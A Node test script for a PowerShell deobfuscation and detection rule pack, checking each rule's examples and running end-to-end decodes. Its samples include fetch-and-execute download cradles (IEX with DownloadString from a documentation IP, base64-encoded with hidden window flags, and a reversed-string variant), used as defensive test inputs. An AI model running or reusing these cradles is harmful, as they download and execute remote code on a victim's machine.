// Self-tests for the Decode (psparse) rule pack in crates/gui/ui/src/psparse.js.
// Every rule carries true-positive (tp) and false-positive (fp) examples; this
// checks each one, then runs end-to-end decodes. Needs Node 22.7 or later.
//   node tools/psparse-selftest.mjs
import { RULES, ATTACK, matchRules, refang, psAnalyze } from "../crates/gui/ui/src/psparse.js";

let fail = 0, n = 0;
const bad = (msg) => { fail++; console.log(msg); };
for (const r of RULES) {
  const t = r.t || {};
  if (!(t.tp || []).length) bad(`NO TP TESTS  ${r.id}`);
  for (const s of t.tp || []) { n++; if (!matchRules(refang(s)).some((f) => f.id === r.id)) bad(`MISS    ${r.id} | ${s}`); }
  for (const s of t.fp || []) { n++; if (matchRules(refang(s)).some((f) => f.id === r.id)) bad(`FALSE+  ${r.id} | ${s}`); }
  for (const id of r.mitre || []) if (!ATTACK[id]) bad(`UNKNOWN ATT&CK ID ${id} in ${r.id}`);
}

const expect = async (label, cmd, check) => {
  n++;
  const r = await psAnalyze(cmd);
  if (!check(r)) bad(`E2E FAIL ${label}: ${r.vtext} | ${r.findings.map((f) => f.id).join(",")} | ${r.final.slice(0, 120)}`);
};
const inner = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/a.ps1')";
const b64 = Buffer.from(inner, "utf16le").toString("base64");
await expect("base64 cradle", `powershell -nop -w hidden -enc ${b64}`,
  (r) => r.layers >= 1 && r.vsev === "critical" && r.final.includes("DownloadString") && (r.iocs.ipv4 || []).includes("192.0.2.44"));
await expect("reversed string", "$m='gnirtSdaolnwoD'[-1..-14] -join '';(New-Object Net.WebClient).$m('http://192.0.2.44/b')",
  (r) => r.findings.some((f) => f.id === "ENC-REVERSE"));
await expect("benign admin", "Get-ChildItem C:\\Temp -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force",
  (r) => r.vsev === "ok");

console.log(`${RULES.length} rules, ${n} checks, ${fail} failures`);
process.exit(fail ? 1 : 0);
